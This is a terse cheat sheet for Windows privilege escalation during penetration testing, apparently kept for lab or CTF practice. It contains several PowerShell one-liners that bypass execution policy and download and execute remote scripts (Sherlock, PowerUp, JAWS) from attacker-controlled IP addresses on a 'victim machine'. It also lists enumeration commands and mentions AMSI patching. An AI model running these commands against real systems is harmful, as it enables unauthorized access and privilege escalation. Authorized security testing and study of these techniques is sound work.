### Don't forget to make command with extension 

```
PowerUp.ps1
winPEAS.exe

PS C:\users\public\downloads> . 
.\PowerUp.ps1PS C:\users\public\downloads> Invoke-AllChecks
```

###Service
```
https://book.hacktricks.xyz/windows/windows-local-privilege-escalation#services
./accesschk.exe -ucqv -accepteula UsoSvc 
Get-WmiObject win32_service | Format-Table -Wrap -AutoSize -Property State,Name,PathName 
```


https://github.com/gtworek/Priv2Admin

https://github.com/frizb/Windows-Privilege-Escalation
AMSI PATCH
https://recipeforroot.com/advanced-powerup-ps1-usage/

###powershell with Priv checker
```
powershell -ep bypass
PS C:\> Import-Module PowerUp.ps1

PS C:\> . .\PowerUp.ps1
```
![image](https://user-images.githubusercontent.com/9059079/118397345-7f3fdd80-b621-11eb-805e-df3757f8e371.png)

```


PS C:\Users\merlin\Desktop> PS C:\Users\merlin\Desktop> powershell.exe -exec bypass -Command "& {Import-Module .\Sherlock.ps1; Find-AllVulns}"
PS C:\users\merlin\appdata\local\temp> iex(new-object net.webclient).downloadstring('http://10.10.14.5/Sherlock.ps1')
PS C:\users\merlin\appdata\local\temp> Find-AllVulns

c:\>powershell.exe "IEX(New-Object Net.WebClient).downloadString('http://192.168.1.2:8000/PowerUp.ps1') ; Invoke-AllChecks"

c:\>powershell.exe -ExecutionPolicy Bypass -noLogo -Command "IEX(New-Object Net.WebClient).downloadString('http://192.168.1.2:8000/powerup.ps1') ; Invoke-AllChecks"

c:\>powershell.exe "IEX(New-Object Net.WebClient).downloadString('http://192.168.1.2:8000/Sherlock.ps1') ; Find-AllVulns"

If you have your ps1 file downloaded to the victim machine then run using this
c:\>powershell.exe -exec bypass -Command "& {Import-Module .\Sherlock.ps1; Find-AllVulns}"

c:\>powershell.exe -exec bypass -Command "& {Import-Module .\PowerUp.ps1; Invoke-AllChecks}"
```
#
powershell iex (New-Object Net.WebClient).DownloadString('http://10.10.14.124:8111/Sherlock.ps1'); Find-AllVulns

Post Exploit Enum Scripts:
JAWS - Just Another Windows (Enum) Script
```
\Inetpub>icacls wwwroot
```
Usage:

Run from within CMD shell and write out to file.

powershell -exec bypass -c (new-object System.Net.WebClient).DownloadFile('http://10.10.15.24/jaws.ps1','C:\Windows\temp\jaws.ps1')
CMD C:\Windows\temp> powershell.exe -ExecutionPolicy Bypass -File .\jaws-enum.ps1 -OutputFilename JAWS-Enum.txt
Run from within CMD shell and write out to screen.

CMD C:\temp> powershell.exe -ExecutionPolicy Bypass -File .\jaws-enum.ps1
Run from within PS Shell and write out to file.

PS C:\temp> .\jaws-enum.ps1 -OutputFileName Jaws-Enum.txt
WinPrivCheck by ihack4falafel

Sherlock – New one is Watson
```
PS C:\inetpub\drupal-7.54> IEX(New-Object Net.WebClient).downloadString('http://10.10.14.124:8000/Sherlock.ps1') ; Find-AllVulns
C:\inetpub\drupal-7.54>powershell.exe -ExecutionPolicy Bypass -File jaws-enum.ps1
```
PentestMonkey Windows-privesc-check is standalone executable that runs on Windows systems. It tries to find misconfigurations that could allow local unprivileged users to escalate privileges to other users or to access local apps (e.g. databases).

Exploit Suggester For this one, we need to grab the output of systeminfo and then run it against the script. -- Update the database: ./windows-exploit-suggester.py --update
./windows-exploit-suggester.py --database 2018-10-28-mssb.xlsx --systeminfo winsysinfo.txt
OR
-- If we only know about the Operating System name and not much about the hot-fixes, then possible exploits for an operating system can be used without hotfix data
```
./windows-exploit-suggester.py --database 2018-10-28-mssb.xlsx --ostext 'windows server 2008 r2'
```
```
wmic qfe get Caption,Description,HotFixID,InstalledOn

https://guide.offsecnewbie.com/privilege-escalation/windows-pe
```
